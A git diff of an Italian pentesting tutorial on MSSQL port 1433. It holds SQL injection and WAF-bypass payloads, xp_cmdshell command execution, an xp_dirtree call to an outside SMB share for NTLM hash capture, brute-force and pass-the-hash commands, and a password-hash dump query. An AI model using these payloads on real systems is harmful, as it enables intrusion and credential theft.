@@ -1,7 +1,7 @@
 ---
-title: 'SQL Injection MSSQL: xp_cmdshell, WAF Bypass e RCE'
+title: 'Pentesting MSSQL: Porta 1433,Enumerazione, Attacco e Payload'
 slug: porta-1433-mssql
-description: 'Guida SQL injection MSSQL: UNION, blind, stacked, WAF bypass, xp_dirtree per hash NTLM e xp_cmdshell per RCE. Dalla porta 1433 alla shell.'
+description: 'Scopri come enumerare ed entrare su MSSQL (port 1433): pentest per credenziali deboli, xp_dirtree per hash NTLM, xp_cmdshell per RCE e pivoting su linked server'
 image: /mssqlù.webp
 draft: false
 date: 2026-02-01T00:00:00.000Z
@@ -14,104 +14,63 @@ tags:
   - mssql
 ---
 
-Da una porta 1433 aperta o da una SQL Injection su MSSQL (Microsoft SQL Server) puoi arrivare a enumerazione completa, hash capture con `xp_dirtree`, RCE tramite `xp_cmdshell` e movimento laterale in Active Directory. Questa guida ti porta dall'inizio alla fine, coprendo entrambi i percorsi.
+# MSSQL Porta 1433: Guida Completa a Enumerazione, Exploitation e Privilege Escalation
+
+Un server MSSQL con la porta 1433 esposta è uno dei target più redditizi in un'infrastruttura Windows: con le credenziali giuste arrivi da un semplice login a shell SYSTEM. Questa guida copre solo l'accesso diretto al database (via mssqlclient, sqsh, credenziali) — non la SQL Injection via web, che trovi nella [guida SQL Injection su MSSQL](https://hackita.it/articoli/sql-injection-mssql/).
 
 **Cosa imparerai:**
 
-* Come capire se un server espone MSSQL sulla porta 1433
-* Come entrare con credenziali deboli o brute force
-* Come sfruttare una SQL Injection su MSSQL: tutte le varianti di sintassi da provare
-* Come catturare hash NTLM con `xp_dirtree` senza sysadmin e senza alert EDR
-* Come arrivare a RCE con `xp_cmdshell` e metodi alternativi più stealth
-* Come muoverti tra SQL Server con i linked server
-* Come sfruttare l'integrazione AD e fare Kerberoasting dal DB
+* Come enumerare un'istanza MSSQL sulla porta 1433/1434
+* Come accedere con credenziali deboli o rubate
+* Come vedere database, tabelle e colonne partendo da zero
+* Come capire chi sei e che privilegi hai
+* Come enumerare configurazione, job, credential e stored procedure custom dell'istanza
+* Come catturare hash NTLM anche senza sysadmin
+* Come ottenere RCE con xp\_cmdshell e alternative più stealth
+* Come muoverti tra server collegati (linked server) e verso Active Directory
+* Come rilevare e difendersi da questi attacchi (lato blue team)
 
-**Prerequisiti:** conoscenza base di SQL, un proxy come [Burp Suite](https://hackita.it/articoli/burp-suite) e accesso a un ambiente di test autorizzato.
+**Prerequisiti:**
 
-***
-
-## Due percorsi di attacco
-
-Prima di iniziare, chiarisci da dove stai partendo:
-
-* **Hai la porta 1433 esposta?** → Parti da enumerazione e brute force (sezioni 2–3)
-* **Hai una web app vulnerabile?** → Parti dalla SQL Injection (sezioni 4–11)
-
-In entrambi i casi l'obiettivo è lo stesso: arrivare a privilegi SQL utili per hash capture, RCE o lateral movement. Le sezioni 12–16 si applicano a entrambi i percorsi.
+| Cosa serve                                                  | Perché                                  |
+| ----------------------------------------------------------- | --------------------------------------- |
+| Accesso di rete alla porta 1433/1434                        | Senza questo non c'è nulla da enumerare |
+| [Impacket](https://hackita.it/articoli/impacket) installato | Per `mssqlclient.py`                    |
+| Ambiente di test autorizzato (HTB, lab, CTF)                | Ogni comando qui è didattico            |
 
 ***
 
-## Indic
+## 1. Perché la porta 1433 è un target ad alto valore {#1}
 
-1. [Perché MSSQL è un target ad alto valore](#1)
-2. [Enumerazione Porta 1433](#2)
-3. [Accesso Diretto: Credenziali, Brute Force e Connessione](#3)
-4. [SQL Injection su MSSQL: Identificare il Punto Vulnerabile](#4)
-5. [La Sintassi: Apici, Commenti e Terminatori](#5)
-6. [Varianti da Provare Quando il Payload Non Funziona](#6)
-7. [UNION-Based: Dump Visivo dei Dati](#7)
-8. [Error-Based: Fai Parlare gli Errori](#8)
-9. [Blind SQL Injection: Boolean e Time-Based](#9)
-10. [Stacked Queries: Statement Multipli](#10)
-11. [Hash Capture via xp\_dirtree](#11)
-12. [RCE con xp\_cmdshell e Metodi Alternativi](#12)
-13. [Privilege Escalation Interna](#13)
-14. [Linked Server: Lateral Movement tra SQL Server](#14)
-15. [Active Directory e Kerberoasting da MSSQL](#15)
-16. [Tool Completo](#16)
-17. [Percorso Operativo Consigliato](#17)
-18. [Troubleshooting](#18)
-19. [FAQ](#19)
-20. [Cheat Sheet Finale](#20)
+MSSQL non è "solo un database": ha funzioni native che permettono di uscire dal contesto SQL ed eseguire comandi sul sistema operativo sottostante. Un accesso anche a basso privilegio spesso porta a shell SYSTEM.
+
+| Funzionalità                 | Cosa fa                                               | Privilegi richiesti        |
+| ---------------------------- | ----------------------------------------------------- | -------------------------- |
+| `xp_cmdshell`                | Esegue comandi OS                                     | sysadmin                   |
+| `xp_dirtree` / `xp_subdirs`  | Forza connessione SMB → hash NTLMv2                   | Basso, spesso pubblico     |
+| Linked Server                | Lateral movement tra istanze SQL, anche cross-dominio | Variabile                  |
+| `sp_execute_external_script` | Esegue Python/R sul server                            | Config abilitata           |
+| `OPENROWSET BULK`            | Legge file dal filesystem                             | ADMINISTER BULK OPERATIONS |
+| `xp_regread`                 | Legge il registro di Windows                          | sysadmin                   |
+| CLR Assembly (UDF custom)    | Carica una DLL .NET come funzione SQL                 | accesso `dbo`              |
 
 ***
 
-## 1. Perché MSSQL è un target ad alto valore {#1}
+## 2. Enumerazione: Nmap e SQL Browser Service {#2}
 
-Microsoft SQL Server è il database enterprise dominante in ambienti Windows. A differenza di MySQL o PostgreSQL, MSSQL ha funzionalità native che permettono di uscire dal database e interagire direttamente con il sistema operativo:
-
-| Funzionalità                 | Cosa fa                             | Privilegi richiesti        |
-| ---------------------------- | ----------------------------------- | -------------------------- |
-| `xp_cmdshell`                | Esegue comandi OS                   | sysadmin                   |
-| `xp_dirtree`                 | Forza connessione SMB → hash NTLMv2 | Basso                      |
-| Linked Server                | Lateral movement tra istanze SQL    | Variabile                  |
-| `sp_execute_external_script` | Esegue Python/R sul server          | Config abilitata           |
-| `OPENROWSET BULK`            | Legge file dal filesystem           | ADMINISTER BULK OPERATIONS |
-| `xp_regread`                 | Legge il registro di Windows        | sysadmin                   |
-
-Una SQLi o credenziali deboli su MSSQL non è solo un data breach: con i permessi giusti arrivi a una shell SYSTEM e potenzialmente al dominio AD.
-
-**Database di sistema di default** — ignora questi nell'enumerazione:
-
-| Nome             | Note                                       |
-| ---------------- | ------------------------------------------ |
-| master           | Sempre presente — contiene config e logins |
-| model            | Template per nuovi DB                      |
-| msdb             | SQL Server Agent — job e alert             |
-| tempdb           | Dati temporanei                            |
-| northwind / pubs | Solo versioni vecchie                      |
-
-***
-
-## 2. Enumerazione Porta 1433 {#2}
-
-La porta **1433/TCP** è il default per le istanze MSSQL standard. La porta **1434/UDP** è il SQL Browser Service: serve a scoprire le istanze *named*, che non stanno sulla 1433 ma su porte dinamiche assegnate al momento dell'installazione. Se 1433 è chiusa, sempre fare scan su 1434/UDP e poi scan dell'intera range alta.
+La porta **1433/TCP** ospita l'istanza MSSQL di default. La porta **1434/UDP** è il SQL Browser Service, che risponde con le istanze *named* — installazioni secondarie su porte dinamiche non prevedibili.
 
 ```bash
 # Scan base con script MSSQL
 nmap -sV -sC -p 1433 10.10.10.15
 
-# Scan completo con tutti gli script MSSQL
+# Scan completo con tutti gli script ms-sql
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
 ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
---script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,\
-mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.15
+-p 1433 10.10.10.15
 
-# SQL Browser per istanze named
+# SQL Browser per scoprire istanze named
 nmap -sU -p 1434 10.10.10.15
-
-# Se sospetti istanze named su porte dinamiche
-nmap -p 1024-65535 --open 10.10.10.15
 ```
 
 **Output atteso:**
@@ -123,33 +82,30 @@ nmap -p 1024-65535 --open 10.10.10.15
 |   NetBIOS_Domain_Name: CORP
 |   NetBIOS_Computer_Name: SQL01
 |   DNS_Domain_Name: corp.local
-|   DNS_Computer_Name: SQL01.corp.local
 ```
 
-Versione esatta, dominio, hostname — tutto utile per CVE matching e per la catena AD.
+Da qui hai già versione, dominio e hostname — dati utili per il resto della catena.
+
+> Se conosci il nome dell'organizzazione, uno shodan dork come `Microsoft SQL Server` ti dice quante istanze MSSQL sono esposte pubblicamente — utile in ricognizione OSINT, mai da usare contro target non autorizzati.
 
 ***
 
-## 3. Accesso Diretto: Credenziali, Brute Force e Connessione {#3}
+## 3. Accesso: Credenziali, Brute Force e Connessione {#3}
 
-### Credenziali default e deboli da provare
+### Credenziali di default da provare per prime
 
-| Username        | Password        | Note                             |
-| --------------- | --------------- | -------------------------------- |
-| `sa`            | \`\` (vuota)    | Default su installazioni vecchie |
-| `sa`            | `sa`            | Classica                         |
-| `sa`            | `Password1`     | Policy minima                    |
-| `sa`            | `admin`         | Abitudine comune                 |
-| `sa`            | nome del server | Frequente in enterprise          |
-| `administrator` | `administrator` | Account Windows                  |
-| `sa`            | `sqlserver`     | Default alcune versioni          |
+| Username | Password        | Note                             |
+| -------- | --------------- | -------------------------------- |
+| `sa`     | (vuota)         | Default su installazioni datate  |
+| `sa`     | `sa`            | Classica                         |
+| `sa`     | `Password123`   | Policy minima comune             |
+| `sa`     | nome del server | Frequente in ambienti enterprise |
 
-### Brute force con nxc / CrackMapExec
+### Brute force
 
 ```bash
-# SQL auth
+# nxc / CrackMapExec — SQL auth
 nxc mssql 10.10.10.15 -u sa -p passwords.txt
-nxc mssql 10.10.10.15 -u users.txt -p 'Password123'
 
 # Windows auth (dominio)
 nxc mssql 10.10.10.15 -u users.txt -p 'Password123' -d corp.local
@@ -157,12 +113,8 @@ nxc mssql 10.10.10.15 -u users.txt -p 'Password123' -d corp.local
 # Pass-the-hash
 nxc mssql 10.10.10.15 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash
 
-# Enum utenti AD via RID bruteforce
-nxc mssql 10.10.10.15 -u sa -p 'Password123' --rid-brute 5000
-
-# Esegui comando direttamente se hai le creds
-crackmapexec mssql -d corp -u user -p pass -x "whoami"
-crackmapexec mssql -d corp -u user -H hash -X '$PSVersionTable'
+# nmap brute
+nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.15
 ```
 
 **Output (creds valide):**
@@ -171,9 +123,9 @@ crackmapexec mssql -d corp -u user -H hash -X '$PSVersionTable'
 MSSQL 10.10.10.15 1433 SQL01 [+] CORP\sa:Password123 (Pwn3d!)
 ```
 
-`(Pwn3d!)` = sysadmin confermato.
+`(Pwn3d!)` conferma sysadmin.
 
-### Connessione con impacket-mssqlclient
+### Connessione
 
 ```bash
 # SQL auth
@@ -182,613 +134,331 @@ mssqlclient.py sa:Password123@10.10.10.15
 # Windows auth
 mssqlclient.py -windows-auth CORP/user:pass@10.10.10.15
 
-# Con database specifico
-mssqlclient.py [-db NomeDB] sa:pass@10.10.10.15
+# Pass-the-hash
+mssqlclient.py -windows-auth CORP/user@10.10.10.15 -hashes aad3b435b51404eeaad3b435b51404ee:HASH
 
 # sqsh (alternativa)
 sqsh -S 10.10.10.15 -U sa -P Password123
-sqsh -S 10.10.10.15 -U .\\utente_locale -P pass   # Windows auth locale
 ```
 
-**Comandi utili dentro la shell mssqlclient:**
+Una volta dentro `mssqlclient.py`, sei in una shell SQL interattiva: da qui in poi tutti i comandi delle sezioni seguenti si digitano lì dentro.
 
-```
-enable_xp_cmdshell
-xp_cmdshell whoami
-enum_links
-use_link [NOME_LINK]
-```
+***
 
-### Enumerazione post-accesso diretto
+## 4. Le Basi: Vedere Database, Tabelle e Colonne {#4}
+
+Se non hai mai usato MSSQL, parti da qui — un passo alla volta, senza saltare.
+
+### Passo 1 — Chi sei e su cosa sei collegato
 
 ```sql
 SELECT @@VERSION;
-SELECT DB_NAME();
 SELECT SYSTEM_USER;
-SELECT USER_NAME();
-SELECT @@SERVERNAME;
-SELECT DEFAULT_DOMAIN();
-SELECT IS_SRVROLEMEMBER('sysadmin');
-SELECT * FROM fn_my_permissions(NULL,'SERVER');
+SELECT DB_NAME();
+```
+
+`DB_NAME()` ti dice su quale database sei atterrato per default (di solito `master`).
+
+### Passo 2 — Vedere tutti i database esistenti
+
+```sql
 SELECT name FROM sys.databases;
-SELECT service_account FROM sys.dm_server_services;
-SELECT name, data_source FROM sys.servers WHERE is_linked=1;
-SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin',name)=1;
-
--- Hashes SQL logins (MSSQL 2005+ hashcat mode 132)
-SELECT name+'-'+master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;
 ```
+
+Alternativa più compatibile con versioni vecchie:
+
+```sql
+SELECT name FROM master.dbo.sysdatabases;
+```
+
+Output tipo:
+
+```
+master
+tempdb
+model
+msdb
+financial_planner
+```
+
+I primi quattro sono database di sistema (li vedi in dettaglio nella sezione 6). `financial_planner` è il database dell'applicazione — quello che ti interessa.
+
+### Passo 3 — Spostarti su un database specifico
+
+```sql
+USE financial_planner;
+```
+
+Da questo momento le query "senza prefisso" lavorano su questo database.
+
+### Passo 4 — Vedere le tabelle di quel database
+
+```sql
+SELECT table_name FROM information_schema.tables;
+```
+
+Alternativa (funziona anche su versioni datate):
+
+```sql
+SELECT name FROM sysobjects WHERE xtype='U';
+```
+
+`xtype='U'` significa "user table" — esclude viste e tabelle di sistema.
+
+Output:
+
+```
+users
+accounts
+transactions
+```
+
+### Passo 5 — Vedere le colonne di una tabella specifica
+
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name='users';
+```
+
+Output:
+
+```
+id
+username
+password_hash
+email
+is_admin
+created_at
+```
+
+### Passo 6 — Vedere i dati
+
+```sql
+SELECT * FROM users;
+```
+
+Oppure solo le colonne che ti interessano:
+
+```sql
+SELECT username, password_hash FROM users;
+```
+
+> **Errore tipico:** dimenticare `USE database;` prima di interrogare le tabelle — se salti questo passo, la query cerca la tabella nel database sbagliato e ottieni "Invalid object name".
 
 ***
 
-## 4. SQL Injection su MSSQL: Identificare il Punto Vulnerabile {#4}
+## 5. Chi Sono? Enumerazione di Utente e Privilegi {#5}
 
-Se la sorgente è una web app che usa MSSQL come backend, prima conferma il DBMS e il contesto del parametro, poi scegli il payload. I punti più comuni sono parametri GET/POST di ricerca, filtri, ID, cookie di sessione e header HTTP.
-
-### Test iniziale
-
-```
-'
-''
-' OR '1'='1
-' AND '1'='1
-' AND '1'='2
-1 AND 1=1
-1 AND 1=2
-```
-
-### Interpretare la risposta
-
-| Cosa vedi                                | Significato                                  |
-| ---------------------------------------- | -------------------------------------------- |
-| Errore SQL (`Incorrect syntax near...`)  | Injection confermata — error-based possibile |
-| Pagina diversa tra `AND 1=1` e `AND 1=2` | Boolean blind confermata                     |
-| Ritardo 5+ secondi con `WAITFOR DELAY`   | Time-based blind confermata                  |
-| Nessuna differenza                       | WAF attivo o parametro non iniettabile       |
-
-### Fingerprinting progressivo — capire quale DB è
-
-Prima di usare payload MSSQL-specifici, identifica il DBMS. Il metodo più affidabile via web è il **time-based**: ogni DB ha la sua funzione di delay.
+Prima di cercare exploit, capisci con che permessi stai lavorando: la stessa tecnica su un utente `sysadmin` e su uno `public` produce risultati completamente diversi.
 
 ```sql
--- MSSQL → WAITFOR DELAY (esclusivo, non esiste su nessun altro DBMS)
-'; WAITFOR DELAY '0:0:5';-- -
-
--- MySQL/MariaDB → SLEEP
-' AND SLEEP(5)-- -
-
--- PostgreSQL → pg_sleep
-' AND pg_sleep(5)>0-- -
-
--- Oracle → DBMS_PIPE
-' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
-```
-
-Se con `WAITFOR DELAY` il server risponde dopo 5 secondi → **sei su MSSQL**, stop.
-
-Se gli errori sono visibili, anche il testo dell'errore fingerprinta il DB:
-
-| Errore                                 | DBMS       |
-| -------------------------------------- | ---------- |
-| `Incorrect syntax near`                | MSSQL      |
-| `You have an error in your SQL syntax` | MySQL      |
-| `unterminated quoted string`           | PostgreSQL |
-| `ORA-00933`                            | Oracle     |
-
-### Conferma MSSQL con payload specifici
-
-Una volta sospettato MSSQL, conferma con funzioni che esistono solo su SQL Server:
-
-```sql
-' AND @@CONNECTIONS>0-- -                  → solo MSSQL
-' AND BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)-- -   → solo MSSQL
-' AND 1=CONVERT(int,@@VERSION)-- -         → errore con versione MSSQL nel testo
-' AND @@VERSION LIKE '%Microsoft SQL Server%'-- -  → TRUE solo su MSSQL
-```
-
-***
-
-## 5. La Sintassi: Apici, Commenti e Terminatori {#5}
-
-### Il singolo apice `'`
-
-Il parametro web viene inserito in una query tipo:
-
-```sql
-SELECT * FROM products WHERE name = 'INPUT'
-```
-
-Iniettando `'` chiudi la stringa prima del tempo → errore SQL → confermata.
-
-### I commenti: `--`, `-- -`, `--+`
-
-Dopo il payload devi commentare il resto della query originale. `--` in SQL richiede tecnicamente uno spazio dopo per essere valido (`-- `).
-
-| Commento | Funzionamento                          | Quando usarlo                         |
-| -------- | -------------------------------------- | ------------------------------------- |
-| `--`     | Funziona su MSSQL anche senza spazio   | Default                               |
-| `-- -`   | `--` + spazio + `-` → spazio garantito | Quando `--` viene troncato o filtrato |
-| `--+`    | In URL `+` = spazio → diventa `-- `    | Parametri GET in URL                  |
-| `/* */`  | Commento inline                        | Bypass filtri su spazi e keyword      |
-
-**Regola pratica:** usa `-- -` nei body POST via Burp, `--+` nei parametri GET URL.
-
-### Il punto e virgola `;`
-
-Chiude lo statement corrente e apre il successivo. Necessario per stacked queries e stored procedure. Schema completo lato web:
-
-```
-'                   → chiude la stringa
-; payload           → nuovo statement
-;-- -               → chiude il nuovo statement e commenta il resto
-```
-
-Quindi la struttura corretta per stacked queries via web è:
-
-```
-'; EXEC xp_cmdshell 'whoami';-- -
-^^                           ^^
-chiude stringa    chiude statement + commenta
-```
-
-### AND vs OR
-
-| Operatore       | Effetto                      | Quando usarlo                               |
-| --------------- | ---------------------------- | ------------------------------------------- |
-| `' AND 1=1-- -` | Mantiene il filtro originale | Boolean blind, UNION                        |
-| `' AND 1=2-- -` | Forza FALSE                  | Verifica discriminatore blind               |
-| `' OR 1=1-- -`  | Bypassa tutti i filtri       | Authentication bypass — genera molto rumore |
-
-***
-
-## 6. Varianti da Provare Quando il Payload Non Funziona {#6}
-
-In un test reale `' UNION SELECT 1,2,3-- -` quasi mai funziona al primo tentativo. Segui questo ordine di lavoro:
-
-```
-1. Identifica il contesto del parametro
-2. Prova la variante di commento giusta
-3. Prova UNION SELECT
-4. Se UNION non va → prova error-based o blind
-5. Se stacked funziona → prova xp_dirtree e poi xp_cmdshell
-```
-
-### Step 1 — Identifica il contesto
-
-```
-Prova:  '    → errore syntax
-Prova:  ''   → errore sparisce → contesto stringa semplice
-Prova:  ')   → errore sparisce → contesto con parentesi
-Prova:  '))  → errore sparisce → doppia parentesi
-Prova:  1    → nessun errore  → intero (nessun apice)
-```
-
-### Step 2 — Prova le varianti in ordine
-
-Per **stringa semplice** — prova queste nell'ordine, fermati quando funziona:
-
-```sql
-' UNION SELECT 1,2,3-- -
-' UNION SELECT 1,2,3--+
-' UNION SELECT 1,2,3--
-' UNION SELECT NULL,NULL,NULL-- -
-' UNION ALL SELECT 1,2,3-- -
-```
-
-Per **parametro con parentesi**:
-
-```sql
-') UNION SELECT 1,2,3-- -
-')) UNION SELECT 1,2,3-- -
-```
-
-Per **stacked queries** — nota il `;` finale prima del commento:
-
-```sql
-'; SELECT 1;-- -
-'; WAITFOR DELAY '0:0:5';-- -
-'; EXEC xp_dirtree '\\10.10.14.123\share';-- -
-'; EXEC xp_cmdshell 'whoami';-- -
-```
-
-Per **parametro numerico** (nessun apice):
-
-```sql
-1 UNION SELECT 1,2,3-- -
-1 AND 1=1-- -
-1; WAITFOR DELAY '0:0:5';-- -
-```
-
-### Step 3 — Bypass spazi e keyword WAF
-
-```sql
--- Commento inline al posto degli spazi
-'/**/UNION/**/SELECT/**/1,2,3-- -
-
--- URL encoding (GET)
-'+UNION+SELECT+1,2,3-- -
-'%09UNION%09SELECT%091,2,3-- -      (TAB)
-'%0aUNION%0aSELECT%0a1,2,3-- -     (newline)
-'%0bUNION%0bSELECT%0b1,2,3-- -     (vertical tab)
-'%0cUNION%0cSELECT%0c1,2,3-- -     (form feed)
-'%0dUNION%0dSELECT%0d1,2,3-- -     (carriage return)
-'%a0UNION%a0SELECT%a01,2,3-- -      (non-breaking space)
-
--- Null byte
-'%00UNION SELECT 1,2,3-- -
-
--- Case mixing
-' UnIoN SeLeCt 1,2,3-- -
-
--- UNION variants (bypass regex su "union select")
-' UNION ALL SELECT 1,2,3-- -
-' UNION DISTINCT SELECT 1,2,3-- -
-' UNION DISTINCTROW SELECT 1,2,3-- -
-
--- Spezza UNION e SELECT con commento (bypassa regex "union select" come stringa unica)
-' UNION/**/SELECT 1,2,3-- -
-' UN/**/ION SE/**/LECT 1,2,3-- -
-' UNION%0aSELECT 1,2,3-- -
-
--- Double encoding
-'%2527 UNION SELECT 1,2,3-- -
-```
-
-### Step 4 — ORDER BY injection
-
-Quando il punto iniettabile è nel clausola `ORDER BY`, UNION non funziona. Usa error-based:
-
-```sql
--- Errore con il valore nel testo
-ORDER BY 1,CONVERT(int,@@VERSION)-- -
-ORDER BY (SELECT 1 WHERE 1=CONVERT(int,@@VERSION))-- -
-ORDER BY (SELECT TOP 1 name FROM master..sysdatabases)-- -
-
--- Boolean via ORDER BY (cambia ordine risultati)
-ORDER BY (SELECT CASE WHEN (1=1) THEN name ELSE id END FROM users)-- -
-ORDER BY (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 1 ELSE 2 END)-- -
-```
-
-### Step 5 — Tecniche avanzate WAF bypass
-
-**HTTP Parameter Pollution (HPP)**
-Se l'app ha due parametri che finiscono nella stessa query, puoi spezzare il payload tra i due — il WAF ispeziona ogni parametro singolarmente e non vede il payload completo:
-
-```
-# WAF vede: "1" e "UNION SELECT 1,2,3-- -" separati → non blocca
-# Backend concatena: "1 UNION SELECT 1,2,3-- -" → esegue
-
-?year=1 UNION SELECT /*&month=*/ 1,2,3-- -
-?id=1 UNION /*&cat=*/ SELECT 1,2,3-- -
-```
-
-**CR/LF nel payload**
-SQL tollera carriage return e line feed all'interno delle query. Utile quando `union select` viene bloccato come stringa unica:
-
-```
-' UNION%0d%0aSELECT 1,2,3-- -
-' UNION%0d%0aSELECT%0d%0a1,2,3-- -
-```
-
-**JSON-based bypass (Claroty Team82)**
-Molti WAF (AWS, Cloudflare, F5, Imperva) non ispezionano la sintassi JSON nelle query SQL. Preponi un operatore JSON per accecare il WAF:
-
-```sql
--- MSSQL supporta JSON dal 2016
-' AND JSON_VALUE('{"a":1}','$.a')=1 UNION SELECT 1,2,3-- -
-' OR 1=(SELECT 1 WHERE JSON_VALUE('{"x":"1"}','$.x')='1') UNION SELECT 1,2,3-- -
-```
-
-**Iniezione via header HTTP**
-Se l'app logga o usa il contenuto degli header in query SQL, prova l'injection lì — spesso i WAF non ispezionano gli header con la stessa attenzione del body:
-
-```
-X-Forwarded-For: 1' UNION SELECT 1,2,3-- -
-User-Agent: ' UNION SELECT 1,2,3-- -
-Referer: ' UNION SELECT 1,2,3-- -
-X-Originating-IP: 1' OR 1=1-- -
-```
-
-**Concatenazione stringa MSSQL per bypassare keyword filter**
-
-```sql
--- Costruisci la keyword dinamicamente (bypass blacklist "xp_cmdshell", "UNION", ecc.)
-'; DECLARE @q NVARCHAR(100)='UNI'+'ON SEL'+'ECT 1,2,3';EXEC(@q);-- -
-'; DECLARE @c NVARCHAR(100)='xp_'+'cmdshell';EXEC @c 'whoami';-- -
-```
-
-**Null byte come terminatore**
-
-```sql
-'%00 UNION SELECT 1,2,3-- -
-' UNION SELECT 1,2,3%00-- -
-```
-
-**sqlmap — combinazioni tamper per MSSQL con WAF**
-
-```bash
-# WAF generico
---tamper=space2mssqlblank,charencode,randomcase
-
-# WAF aggressivo
---tamper=space2mssqlblank,charencode,randomcase,between,equaltolike
-
-# Solo obfuscation case+commenti
---tamper=randomcase,space2comment
-
-# Encoding Unicode
---tamper=charunicodeencode,randomcase
-
-# Aggiungi random agent per bypassare fingerprinting sqlmap
---random-agent
-
-# Aggiungi delay per evitare rate limiting
---delay=2 --safe-freq=3
-```
-
-***
-
-## 7. UNION-Based: Dump Visivo dei Dati {#7}
-
-### Trova il numero di colonne
-
-```sql
--- ORDER BY (errore quando superi le colonne reali)
-' ORDER BY 1-- -
-' ORDER BY 2-- -
-' ORDER BY N-- -
-
--- UNION NULL (type-safe, funziona sempre)
-' UNION SELECT NULL-- -
-' UNION SELECT NULL,NULL-- -
-' UNION SELECT NULL,NULL,NULL-- -
-
--- Interi (se le colonne accettano int)
-' UNION SELECT 1-- -
-' UNION SELECT 1,2-- -
-' UNION SELECT 1,2,3-- -
-```
-
-**Come interpretare ORDER BY:**
-Se `ORDER BY 6` non dà errore e `ORDER BY 7` crasha → la query ha **6 colonne**. La tua UNION deve avere esattamente 6 valori.
-
-### Trova le colonne visibili a schermo
-
-```sql
-' UNION SELECT 'hackita',NULL,NULL-- -
-' UNION SELECT NULL,'hackita',NULL-- -
-' UNION SELECT NULL,NULL,'hackita'-- -
-```
-
-Quando "hackita" appare nella pagina → quella è la colonna che usi per estrarre i dati.
-
-***
-
-### Flusso pratico: da zero al dump
-
-Hai trovato che la query ha 6 colonne e la colonna visibile è la 2. Segui questo ordine — uno step alla volta.
-
-**Step 1 — Conferma la colonna visibile**
-
-```sql
-' UNION SELECT NULL,'hackita',NULL,NULL,NULL,NULL-- -
-```
-
-Vedi "hackita" nella pagina → colonna 2 confermata. Ora usi sempre la posizione 2 per estrarre dati.
-
-**Step 2 — Enumera i database**
-
-Metti `name` nella colonna visibile, `FROM master..sysdatabases` in fondo:
-
-```sql
-' UNION SELECT NULL,name,NULL,NULL,NULL,NULL FROM master..sysdatabases-- -
-```
-
-Output: vedi i nomi dei database nella pagina. Ignora `master`, `model`, `msdb`, `tempdb` — cerca il DB dell'applicazione.
-
-**Step 3 — Enumera le tabelle**
-
-Sostituisci `NomeDB` con quello trovato al passo precedente:
-
-```sql
-' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM NomeDB.information_schema.tables-- -
-```
-
-Alternativa con sysobjects (funziona anche su versioni vecchie):
-
-```sql
-' UNION SELECT NULL,name,NULL,NULL,NULL,NULL FROM NomeDB..sysobjects WHERE xtype='U'-- -
-```
-
-Vedi `users`, `accounts`, `admin`? Quella è la prossima.
-
-**Step 4 — Enumera le colonne della tabella**
-
-```sql
-' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL FROM NomeDB.information_schema.columns WHERE table_name='users'-- -
-```
-
-Output: `id`, `username`, `password`, `email` → hai i nomi delle colonne.
-
-**Step 5 — Dumpa i dati**
-
-Una colonna alla volta:
-
-```sql
-' UNION SELECT NULL,username,NULL,NULL,NULL,NULL FROM NomeDB..users-- -
-' UNION SELECT NULL,password,NULL,NULL,NULL,NULL FROM NomeDB..users-- -
-```
-
-Username e password sulla stessa riga:
-
-```sql
-' UNION SELECT NULL,username+':'+password,NULL,NULL,NULL,NULL FROM NomeDB..users-- -
-```
-
-Tutti gli utenti concatenati in un blocco unico:
-
-```sql
-' UNION SELECT NULL,(SELECT username+':'+password+' | ' FROM NomeDB..users FOR XML PATH('')),NULL,NULL,NULL,NULL-- -
-```
-
-***
-
-### Dump rapido — altri dati utili
-
-```sql
--- Chi sei sul DB
-' UNION SELECT NULL,SYSTEM_USER,NULL,NULL,NULL,NULL-- -
-' UNION SELECT NULL,DB_NAME(),NULL,NULL,NULL,NULL-- -
-' UNION SELECT NULL,@@SERVERNAME,NULL,NULL,NULL,NULL-- -
-
 -- Sei sysadmin?
-' UNION SELECT NULL,IS_SRVROLEMEMBER('sysadmin'),NULL,NULL,NULL,NULL-- -
+SELECT IS_SRVROLEMEMBER('sysadmin');
 
--- Lista database alternativa (cambia indice 0,1,2,3...)
-' UNION SELECT NULL,DB_NAME(0),NULL,NULL,NULL,NULL-- -
+-- Tutti i tuoi permessi a livello server
+SELECT * FROM fn_my_permissions(NULL,'SERVER');
 
--- Tutte le tabelle di un DB in una riga
-' UNION SELECT NULL,(SELECT table_name+' | ' FROM NomeDB.information_schema.tables FOR XML PATH('')),NULL,NULL,NULL,NULL-- -
+-- Chi altro è sysadmin sul server
+SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
+
+-- Lista di tutti i login
+SELECT name FROM sys.server_principals WHERE type IN ('S','U');
+```
+
+`IS_SRVROLEMEMBER` ritorna `1` (true) o `0` (false) — mai testo.
+
+### Tipi di utenti MSSQL
+
+| Tipo          | Descrizione                                                   |
+| ------------- | ------------------------------------------------------------- |
+| SQL Login     | Autenticazione con username/password gestita dal DB           |
+| Windows Login | Autenticazione tramite account di dominio/locale              |
+| Database User | Mappato a un login, ha permessi solo su un database specifico |
+| sysadmin      | Ruolo server con controllo completo sull'istanza              |
+| public        | Ruolo di default, minimo privilegio                           |
+
+***
+
+## 6. Database di Sistema: Cosa Ignorare {#6}
+
+Quando enumeri i database, questi quattro sono sempre presenti e raramente contengono dati utili per l'attacco — concentrati sul resto.
+
+| Nome     | Cosa contiene                                                           |
+| -------- | ----------------------------------------------------------------------- |
+| `master` | Configurazione a livello di istanza, login, tutti i database registrati |
+| `msdb`   | Job schedulati e alert dello SQL Server Agent                           |
+| `model`  | Template usato per creare ogni nuovo database                           |
+| `tempdb` | Spazio di lavoro temporaneo, si svuota al riavvio                       |
+
